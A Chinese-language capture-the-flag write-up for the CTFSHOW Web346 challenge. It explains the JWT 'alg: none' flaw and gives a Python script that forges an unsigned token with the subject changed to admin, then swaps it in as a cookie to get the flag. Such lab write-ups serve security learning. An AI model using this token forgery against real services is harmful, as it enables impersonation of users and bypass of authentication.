# CTFSHOW Web346

## 前言

JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。
设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。

## 开始做题

首先拿到cookie

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYwOTIzNjg3MCwiZXhwIjoxNjA5MjQ0MDcwLCJuYmYiOjE2MDkyMzY4NzAsInN1YiI6InVzZXIiLCJqdGkiOiI5NDNkMGIzMjM3ODA2NjU5ZDJlMjA1ZTQyYjMxOTQ5NCJ9.9TUQLyYKs97ceFhZQ4BzkAuug6nCgLoMAbLH88kSOwo
```

解码

```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "iss": "admin",
  "iat": 1609236870,
  "exp": 1609244070,
  "nbf": 1609236870,
  "sub": "user",
  "jti": "943d0b3237806659d2e205e42b319494"
}
```

我们需要把sub字段改为admin

但是如果把签名算法改为none的化jwt.io那个网站就无法生成，这个时候可以使用python生成

```python
import jwt

# payload
token_dict = {
  "iss": "admin",
  "iat": 1609236870,
  "exp": 1609244070,
  "nbf": 1609236870,
  "sub": "admin",
  "jti": "943d0b3237806659d2e205e42b319494"
}

headers = {
  "alg": "none",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                       "",  # 进行加密签名的密钥
                       algorithm="none",  # 指明签名算法方式, 默认也是HS256
                       headers=headers 
                       # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       )

print(jwt_token)
```

将生成的字符串来替换原有的cookie获得flag